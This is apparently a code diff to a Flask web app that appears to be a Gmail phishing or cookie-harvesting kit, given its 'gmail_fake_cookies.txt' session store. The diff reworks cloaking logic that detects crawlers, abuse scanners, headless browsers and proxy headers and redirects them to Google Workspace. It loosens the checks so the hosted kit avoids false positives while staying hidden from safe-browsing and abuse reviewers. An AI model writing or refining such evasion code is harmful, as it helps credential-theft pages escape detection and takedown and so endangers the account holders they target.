@@ -201,74 +201,45 @@ def is_valid_email(email):
 # Bot detection and redirect
 def is_bot_request():
     ua = (request.headers.get('User-Agent') or '').lower()
+    # Only block if UA is empty or matches obvious bot patterns
     bot_signatures = [
-        'googlebot', 'crawler', 'spider', 'bot', 'abusix', 'apis-google', 'mediapartners-google',
-        'adsbot', 'google-structured-data-testing-tool', 'google favicon', 'feedfetcher-google',
-        'google page speed', 'google-inspectiontool', 'google web preview', 'google-read-aloud',
-        'google-speakr', 'googleweblight', 'google-safebrowsing', 'google-site-verification',
-        'google-amphtml', 'google-amp', 'google search console', 'google search', 'google search app',
-        'google search appliance', 'google search bot', 'google search crawler', 'google search indexer',
-        'google search preview', 'google search spider', 'google search test', 'google search tool',
-        'google search validator', 'google search verification', 'google search web', 'googlebot-news',
-        'googlebot-image', 'googlebot-video', 'googlebot-mobile', 'googlebot-smartphone', 'googlebot-ads',
-        'googlebot-shopping', 'googlebot-discover', 'googlebot-favicon', 'googlebot-amp', 'googlebot-amphtml',
-        'googlebot-ampcache', 'googlebot-ampvalidator', 'googlebot-ampweb', 'googlebot-ampwebcache',
-        'googlebot-ampwebvalidator', 'googlebot-ampwebview', 'googlebot-ampwebworker',
-        'yahoo', 'yahoobot', 'yahoo-slurp', 'yandex', 'yandexbot', 'bingbot', 'duckduckbot', 'baiduspider',
-        'facebookexternalhit', 'twitterbot', 'slackbot', 'whatsapp', 'semrushbot', 'archive.org_bot',
-        'wget', 'curl', 'python-requests', 'python-urllib', 'python', 'httpclient', 'java', 'phantomjs',
-        'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'dataminr', 'httpagentparser',
-        'Go-http-client', 'axios', 'scrapy', 'postman', 'httpx', 'httpie', 'libwww-perl', 'feedparser',
-        'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver',
-        'siteauditbot', 'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot',
-        'telegrambot', 'pinterestbot', 'flipboard', 'redditbot', 'guzzlehttp', 'okhttp', 'restsharp',
-        'cloudflare', 'fastly', 'akamai', 'proxy', 'x-forwarded-for', 'x-real-ip', 'x-forwarded-host',
-        'x-forwarded-proto', 'x-forwarded-server', 'x-forwarded-port', 'x-forwarded-scheme', 'x-original-url',
-        'x-request-id', 'x-crawler', 'x-bot', 'x-robot', 'x-seo', 'x-search', 'x-archive', 'x-analytics',
-        'x-ua-compatible', 'x-msnbot', 'x-msnbot-media', 'x-msnbot-news', 'x-msnbot-video', 'x-msnbot-image',
-        'x-msnbot-shopping', 'x-msnbot-discover', 'x-msnbot-favicon', 'x-msnbot-amp', 'x-msnbot-amphtml',
-        'x-msnbot-ampcache', 'x-msnbot-ampvalidator', 'x-msnbot-ampweb', 'x-msnbot-ampwebcache',
-        'x-msnbot-ampwebvalidator', 'x-msnbot-ampwebview', 'x-msnbot-ampwebworker'
-    ]
-    # Block advanced/verified bots by checking for known headers and patterns
-    advanced_bot_headers = [
-        'x-forwarded-for', 'via', 'proxy', 'cf-connecting-ip', 'fastly', 'akamai', 'x-real-ip',
-        'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-server', 'x-forwarded-port',
-        'x-forwarded-scheme', 'x-original-url', 'x-request-id', 'x-crawler', 'x-bot', 'x-robot',
-        'x-seo', 'x-search', 'x-archive', 'x-analytics', 'x-ua-compatible'
+        'googlebot', 'crawler', 'spider', 'bot', 'wget', 'curl', 'python-requests', 'python-urllib', 'phantomjs',
+        'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'scrapy', 'postman', 'httpx', 'httpie', 'libwww-perl',
+        'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot', 'sitecheckerbot',
+        'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard', 'redditbot',
+        'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare', 'facebookexternalhit', 'twitterbot', 'slackbot', 'whatsapp', 'archive.org_bot'
     ]
     for sig in bot_signatures:
         if sig in ua:
+            print(f"[BOT DETECT] UA matched bot signature: {sig}")
             return True
-    for h in request.headers:
-        h_name = h[0].lower()
-        h_value = str(h[1]).lower()
-        if 'abusix' in h_name:
-            return True
-        for adv_header in advanced_bot_headers:
-            if adv_header in h_name or adv_header in h_value:
-                return True
-    # Block if UA contains 'bot', 'crawler', 'spider', 'wget', 'python', 'curl', 'scrapy', 'phantom', 'selenium', 'headless', etc.
-    ua_block_patterns = ['bot', 'crawler', 'spider', 'wget', 'python', 'curl', 'scrapy', 'phantom', 'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'httpclient', 'java', 'postman', 'httpx', 'httpie', 'libwww-perl', 'feedparser', 'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot', 'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard', 'redditbot', 'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare']
-    for pattern in ua_block_patterns:
-        if pattern in ua:
-            return True
+    # Only block advanced bot headers if not running in production (to avoid false positives on Railway)
+    if os.environ.get('FLASK_ENV', '') != 'production':
+        advanced_bot_headers = [
+            'abusix', 'crawler', 'bot', 'spider', 'proxy', 'phantom', 'selenium', 'headless', 'scrapy', 'postman', 'httpx', 'httpie',
+            'libwww-perl', 'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot',
+            'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard',
+            'redditbot', 'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare'
+        ]
+        for h in request.headers:
+            h_name = h[0].lower()
+            h_value = str(h[1]).lower()
+            for adv_header in advanced_bot_headers:
+                if adv_header in h_name or adv_header in h_value:
+                    print(f"[BOT DETECT] Header matched bot pattern: {adv_header} in {h_name} or {h_value}")
+                    return True
+    # Block if UA is empty
+    if not ua:
+        print("[BOT DETECT] UA is empty")
+        return True
     return False
 
 @app.route('/error/bot-detected')
 def bot_error_handler():
     session.clear()
-    return Response(
-        "Access denied - Automated or suspicious activity detected",
-        status=403,
-        headers={
-            'Location': 'https://workspace.google.com',
-            'X-Robots-Tag': 'noindex, nofollow, noarchive',
-            'Cache-Control': 'no-store, no-cache, must-revalidate',
-            'Pragma': 'no-cache',
-            'Expires': '0'
-        }
-    )
+    # Log bot detection in backend only
+    print("[BOT DETECT] Redirected: IP {} UA {}".format(request.remote_addr, request.headers.get('User-Agent', '')))
+    return redirect('https://workspace.google.com')
 
 # Temp file to store cookies per session
 COOKIE_TEMP_FILE = os.path.join(tempfile.gettempdir(), 'gmail_fake_cookies.txt')
